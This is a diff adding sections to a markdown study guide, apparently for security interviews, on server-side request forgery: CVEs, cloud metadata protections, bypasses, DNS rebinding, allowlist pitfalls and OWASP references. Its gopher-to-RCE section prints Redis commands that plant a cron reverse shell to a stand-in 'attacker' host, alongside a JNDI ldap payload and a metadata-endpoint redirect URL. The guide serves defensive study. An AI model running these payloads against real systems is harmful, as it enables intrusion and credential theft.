@@ -455,6 +455,276 @@ parsers to be secure by default.
 
 ---
 
+## Real-world SSRF CVEs and incidents
+
+Senior interviews expect you to name more than Capital One. A short roster of high-impact,
+real-world SSRF (with the mechanism):
+
+- **Capital One (2019).** SSRF in a misconfigured WAF (a ModSecurity/`SSRF`-prone reverse
+  proxy) let an attacker reach **IMDSv1** and retrieve the instance role's IAM credentials,
+  which had overly broad S3 permissions — ~100M records exposed. This case drove SSRF into
+  its own OWASP Top 10 slot (A10:2021). **Would IMDSv2 have stopped it?** Very likely: the
+  simple `GET` used could not perform the `PUT`+token handshake, and hop-limit 1 plus
+  `X-Forwarded-For` rejection would have blocked the proxied path. It is the canonical
+  defense-in-depth illustration (fix the SSRF **and** enforce IMDSv2 **and** scope IAM).
+- **ProxyLogon — CVE-2021-26855 (Microsoft Exchange, 2021).** A **pre-auth SSRF** in Exchange:
+  a crafted request to `/autodiscover` with a malicious `X-BEResource` cookie made the
+  front-end (CAS) forward an attacker-controlled request to the back-end as the server itself,
+  effectively **authenticating as the Exchange machine account**. Chained with
+  **CVE-2021-27065** (post-auth arbitrary file write) it yielded RCE; ~30,000+ organizations
+  were compromised. Shows SSRF used for *authentication bypass*, not just credential theft.
+- **GitLab — CVE-2021-22214 (2021).** **Unauthenticated** SSRF via the CI/CD "import project
+  by URL" / `ci/lint` API that fetched a remote `.gitlab-ci.yml`, letting an attacker make the
+  GitLab server issue arbitrary internal requests (including to metadata). A textbook
+  "fetch-a-URL feature" SSRF.
+- **Ivanti Connect Secure (2024) and Grafana.** 2024 saw multiple **SSRF-to-RCE chains** in
+  edge/VPN appliances (Ivanti) and SSRF/path-traversal issues in Grafana data-source proxies.
+  The recurring pattern: an internet-facing device with a URL-fetch or proxy feature reaching
+  its own localhost admin/API.
+
+> [!INTERVIEW]
+> If asked "name an SSRF beyond Capital One," lead with **ProxyLogon (CVE-2021-26855)** — a
+> pre-auth SSRF that authenticated *as the server* and, chained with CVE-2021-27065, gave RCE
+> across tens of thousands of Exchange servers. It reframes SSRF from "credential theft" to
+> "impersonate the trusted server."
+
+---
+
+## GCP and Azure metadata specifics
+
+AWS IMDSv2 is only one cloud's story. The header/handshake requirements differ, and the
+*version-dependent* enforcement is a real SSRF footgun.
+
+**GCP.** Metadata lives at `metadata.google.internal` / `169.254.169.254` (IPv6
+`[fd20:ce::254]`). The modern, safe endpoint `computeMetadata/v1/` **requires the header
+`Metadata-Flavor: Google`**, which most naive SSRF fetchers cannot set — a useful mitigation.
+The footgun: the historical **`v0.1/` and `v1beta1/` endpoints did *not* require that header**
+(they've since been disabled/deprecated). The older `X-Google-Metadata-Request: True` header
+is deprecated in favor of `Metadata-Flavor: Google`. GCP also supports `?recursive=true`
+(dump an entire subtree in one request) and `?alt=json`. Takeaway: header enforcement is
+*version-specific*, so "GCP requires a header" is only true for `computeMetadata/v1/`.
+
+**Azure IMDS.** Endpoint `169.254.169.254/metadata/instance`; identity/token at
+`/metadata/identity/oauth2/token`. Its protections closely parallel IMDSv2:
+
+- Requires the header **`Metadata: true`** — omit it and you get
+  `400 Bad Request … Required metadata header not specified`.
+- **Rejects any request carrying an `X-Forwarded-For` header** (returns an error) — the same
+  proxy-defeating trick IMDSv2 uses.
+- Requires an **`api-version=` query parameter**; a missing/invalid one is a `400`.
+- Is non-routable and **must bypass any HTTP proxy** (`curl --noproxy "*"`), which also blocks
+  the "SSRF through a forward proxy" path.
+
+> [!INTERVIEW]
+> Cloud-comparison drill: **AWS IMDSv2** = `PUT`+token header + hop-limit + XFF-reject; **Azure
+> IMDS** = `Metadata: true` + XFF-reject + `api-version` + no-proxy; **GCP** = `Metadata-Flavor:
+> Google` on `computeMetadata/v1/` (but *not* the legacy `v0.1`/`v1beta1` paths). All three lean
+> on "require a header a simple fetcher can't set," but none replaces fixing the SSRF.
+
+---
+
+## Open-redirect chaining and hidden input vectors
+
+**Open-redirect chaining is distinct from "the server follows redirects."** Here the attacker
+supplies a URL whose **host is fully allowlisted and legitimate**, but that host contains an
+**open-redirect** parameter:
+
+```
+https://trusted.example/redirect?url=http://169.254.169.254/latest/meta-data/
+```
+
+Host validation passes (the authority really is `trusted.example`), the IP check passes (it's a
+public IP), and then the app follows the redirect *internally* to the metadata endpoint. This
+defeats host-allowlisting even with a correct resolved-IP check — the fix is the same as any
+redirect bypass (**don't auto-follow, or re-validate every hop's resolved IP**), plus fixing the
+open redirect on the trusted host.
+
+**SSRF hides in more than the `url` parameter.** Look past the obvious field:
+
+- The **`Referer` header** — analytics and link-preview backends often fetch the Referer value
+  (PortSwigger explicitly calls this out as hidden attack surface).
+- **`Host` / `X-Forwarded-Host`** routing — used by reverse proxies and cache/"absolute URL"
+  builders to construct outbound requests.
+- **`Location`, RSS/OPML feed URLs, SAML/OIDC metadata URLs, PDF/HTML resource references,** and
+  any "proxy target"/"callback"/"webhook"/"image import" field.
+
+The rule: **any user-influenced value that becomes a network destination is an SSRF sink**, not
+just parameters literally named `url`.
+
+---
+
+## Blind SSRF weaponization and client-side exploitation
+
+Blind SSRF is more than a scanner. Two senior points:
+
+**Reading OOB signals precisely.** In out-of-band testing, distinguish the callbacks:
+
+- **DNS lookup *and* HTTP hit** on your listener → the server resolved *and* connected over
+  HTTP: fully exploitable outbound.
+- **DNS lookup but *no* HTTP hit** → DNS egress is open but **HTTP was blocked by network
+  filtering**. This tells you the target is "vulnerable but egress-controlled." Next step: pivot
+  to internal-service-specific OOB payloads, or exploit the server's own HTTP client (below),
+  rather than assuming full outbound reach.
+- **Neither** → the sink may not fire, or DNS egress itself is blocked.
+
+**Semi-blind oracles, quantified.** Without a response body you still get:
+
+- **Timing / connection state:** `connection refused` returns **fast** (port closed), a
+  firewalled/filtered port **hangs then times out** (slow), and an open port returns a response
+  (medium). This three-way timing split is a reliable port-scan oracle.
+- **Response-length and status-code differentials**, and **error-message leakage** used as a
+  boolean oracle ("`Connection refused`" vs. "`400 Bad Request`" vs. a timeout).
+
+**Client-side exploitation of the server's own HTTP stack ("Cracking the Lens").** Force the
+server to connect to *your* server, which returns a **malicious response** that exploits a bug
+in the server's HTTP client/parser (oversized headers, header injection, decompression bombs,
+deserialization of the response). This can yield compromise **with zero response reflection** —
+elevating "blind SSRF" from an information oracle to a code-execution path.
+
+---
+
+## More dangerous schemes and CRLF protocol injection
+
+Beyond `file`/`gopher`/`dict`, language-specific and cross-protocol tricks widen the blast
+radius:
+
+- **`phar://` (PHP).** Triggers PHP **object deserialization** when a Phar archive's metadata is
+  read by a filesystem-style operation — an SSRF/file-path primitive that can reach RCE via a
+  POP gadget chain.
+- **`jar:` and `netdoc:` (Java).** `jar:` fetches and unpacks remote archives; `netdoc:` is a
+  legacy file-read scheme in the JVM.
+- **`ldap://` + JNDI (Java).** SSRF/URL-fetch feeding a JNDI lookup is the **Log4Shell**
+  primitive: `ldap://attacker/Exploit` returns a serialized/remote-classloading payload → RCE.
+  Bridges SSRF to the JNDI-injection class interviewers love.
+- **`data:`** — inline payloads used to smuggle content past content-type or size filters.
+
+**CRLF injection / request smuggling inside the SSRF URL.** Injecting `%0d%0a` (`\r\n`) into the
+path or parameters of the outbound URL can **inject headers or a whole second request** into the
+connection the server opens. This is a milder cousin of gopher: even when only `http`/`https` is
+allowed and `gopher://` is disabled, CRLF smuggling can push text-protocol commands into a
+tolerant internal service (Redis, memcached, SMTP) that ignores the HTTP preamble — so
+"gopher is off" does **not** by itself prove Redis is unreachable. Defense: reject control
+characters in URLs, use a hardened HTTP client that forbids CRLF in request targets, and pin the
+IP + restrict egress.
+
+---
+
+## gopher-to-RCE concrete exploit steps
+
+"Walk me through gopher → RCE" is a standard follow-up. Two canonical chains — the mechanics are
+worth knowing, not just the name:
+
+**1. Unauthenticated Redis.** `gopher://` sends raw bytes, so you script the Redis text protocol:
+
+```
+CONFIG SET dir /var/spool/cron/         # point Redis at the cron directory
+CONFIG SET dbfilename root              # name the DB file 'root' (a crontab)
+SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
+SAVE                                    # flush the DB (writing the cron entry) to disk
+```
+
+The RDB dump written to `/var/spool/cron/root` is parsed by cron as a job → reverse shell.
+Variants write an **SSH `authorized_keys`** to `~/.ssh/` or a webshell into a web root.
+
+**2. PHP-FPM / FastCGI.** Speak the **FastCGI** protocol over gopher to a localhost FPM socket,
+setting the `PHP_VALUE` param to `auto_prepend_file = php://input` (and `allow_url_include=On`),
+then send PHP source in the request body — FPM executes it. This reaches RCE even when no web
+server would route to the target script.
+
+The defense is unchanged: **scheme allowlist (http/https only)**, no arbitrary-byte schemes,
+**egress filtering** so internal Redis/FPM is unreachable, and authentication on internal
+services (don't run unauthenticated Redis).
+
+---
+
+## DNS-rebinding defense implementation traps
+
+"Pin the resolved IP" is the right principle, but naive implementations still rebind. The pin
+must survive every place the stack might re-resolve or re-connect:
+
+- **HTTP redirects.** Each hop is a new request; if the client re-resolves the redirect host,
+  the pin is lost. **Re-pin (resolve + validate + connect-by-IP) on every hop**, or don't follow
+  redirects.
+- **Connection reuse / keep-alive / connection pooling.** A pooled connection keyed by hostname
+  can be reused for a *later* request whose validation you skipped; ensure the pin is bound to
+  the specific validated request, not just the first.
+- **Happy Eyeballs (RFC 8305) dual-stack racing.** Clients race A (IPv4) and AAAA (IPv6)
+  connections in parallel. If you validate only one family, the other can win the race to an
+  internal address. **Validate all resolved addresses (A and AAAA)** before connecting.
+- **Libraries that expose only `connect(hostname)`.** Any API where you validate a resolved IP
+  but then hand the *name* to `connect()` re-resolves and is rebindable.
+
+**Correct pin technique:** resolve the name → validate **every** returned address is public/
+allowlisted → `connect()` to a **literal validated IP**, setting the `Host` header and TLS **SNI**
+to the original name so certificate validation still works. A custom resolver/socket callback
+(e.g. a DNS pinning resolver) that returns only the pinned IP is the robust implementation.
+
+---
+
+## Allowlist correctness pitfalls
+
+Host allowlists fail in subtle, testable ways. Match the **parsed authority**, never a substring:
+
+- **Trailing dot:** `good.example.` (fully-qualified form) is the same host but fails a naive
+  `== "good.example"` and can bypass a suffix check — or vice versa.
+- **Case:** DNS is case-insensitive; `GOOD.Example` must be normalized.
+- **Suffix / prefix confusion:** a `endsWith("good.example")` check is bypassed by
+  `good.example.attacker.com`; a `startsWith`/`contains` check by `attacker-good.example`. The
+  attacker registers a domain that *contains* your allowlisted string.
+- **Unicode / punycode homoglyphs:** `gооd.example` (Cyrillic `о`) or IDN homoglyphs render
+  identically; normalize to punycode and compare.
+- **Port not checked:** `good.example:6379` passes a host-only allowlist but targets a different
+  service. Validate scheme, host, **and port**.
+- **Userinfo:** `good.example@169.254.169.254` (see parser confusion) — reject `@`/userinfo.
+
+Correct matching: parse the URL with one trusted parser, extract the **host and port**, normalize
+(lowercase, strip trailing dot, punycode), and compare against the allowlist by **exact host +
+allowed port**, then still resolve-and-pin the IP.
+
+---
+
+## IMDSv2 residual risk and the hop-limit tension
+
+IMDSv2 is defense in depth, not a cure — enumerate what still defeats it:
+
+- **Full request-forgery primitives.** SSRF that can set arbitrary **headers and method** (some
+  gopher/CRLF-smuggling or library-level SSRF) can perform the `PUT`+token handshake and read
+  credentials anyway.
+- **Request smuggling** into the metadata connection can inject the required `PUT`/headers.
+- **Misconfigured `HttpPutResponseHopLimit > 1`.** Containerized workloads legitimately need
+  **hop limit 2** (the extra hop is the container network bridge), and operators often bump it to
+  2+ for that reason — which simultaneously **re-opens the "SSRF through an extra hop / reverse
+  proxy" path** the default of 1 was closing. This is the sharp senior tension: the value that
+  makes containers work weakens the hop defense. Mitigate by keeping the metadata endpoint
+  reachable **only** from the intended local process (host firewall/`iptables` on
+  `169.254.169.254`) rather than relying on hop-limit alone.
+- **Non-IMDS targets remain.** `file://`, internal admin panels, and Redis are untouched by any
+  IMDS setting.
+
+So: "IMDSv2 enforced, hop-limit 1" is **not** sufficient on its own — still fix the SSRF, block
+egress to `169.254.169.254`, and scope IAM.
+
+---
+
+## Standards and control references
+
+Ground SSRF/XXE claims in named controls (interviewers value precise citations):
+
+- **OWASP Top 10 2021 — A10:2021 Server-Side Request Forgery.** SSRF's dedicated category.
+- **OWASP ASVS v4:**
+  - **§5.2.6 — verify that untrusted data supplied to a URL-fetch is validated/sanitized** to
+    prevent SSRF.
+  - **§12.6 — SSRF Protection Requirements:** the web/app server must not follow redirects to
+    untrusted hosts and outbound requests must be restricted to allowlisted destinations.
+- **OWASP WSTG — WSTG-INPV-19: Testing for Server-Side Request Forgery.** The authoritative test
+  procedure (identify sinks, encoding bypasses, OOB confirmation).
+- **OWASP Cheat Sheets** — SSRF Prevention and XXE Prevention (authoritative defense guidance).
+- **RFCs for the numeric-range check:** RFC 1918 (private IPv4), RFC 3927 (link-local
+  `169.254.0.0/16`), RFC 6598 (CGNAT `100.64.0.0/10`), RFC 4291 (IPv6 addressing, incl.
+  IPv4-mapped `::ffff:0:0/96`), RFC 8305 (Happy Eyeballs dual-stack behavior).
+
+---
+
 ## Common follow-up questions
 
 - **"What is the highest-impact SSRF target and why?"** Cloud instance metadata
@@ -500,4 +770,15 @@ parsers to be secure by default.
 - OWASP A05:2021 — **Security Misconfiguration** (includes XXE):
   https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 - IETF **RFC 3927** (IPv4 Link-Local `169.254.0.0/16`), **RFC 1918** (Private IPv4 ranges),
-  **RFC 6598** (CGNAT `100.64.0.0/10`).
+  **RFC 6598** (CGNAT `100.64.0.0/10`), **RFC 4291** (IPv6 addressing incl. IPv4-mapped
+  `::ffff:0:0/96`), **RFC 8305** (Happy Eyeballs dual-stack connection racing).
+- OWASP **ASVS v4** — **§12.6 SSRF Protection** and **§5.2.6 untrusted URL fetch**:
+  https://owasp.org/www-project-application-security-verification-standard/
+- OWASP WSTG — **WSTG-INPV-19: Testing for Server-Side Request Forgery**.
+- **CVE-2021-26855** (ProxyLogon, Exchange pre-auth SSRF), chained with **CVE-2021-27065**;
+  **CVE-2021-22214** (GitLab unauthenticated SSRF).
+- GCP — **Storing and retrieving instance metadata** (`Metadata-Flavor: Google`,
+  `computeMetadata/v1/`); Azure — **Instance Metadata Service** (`Metadata: true`,
+  `api-version`, `X-Forwarded-For` rejection).
+- PortSwigger — **Cracking the Lens** (client-side exploitation of a server's HTTP stack) and
+  **SSRF hidden attack surface** (Referer/Host vectors).
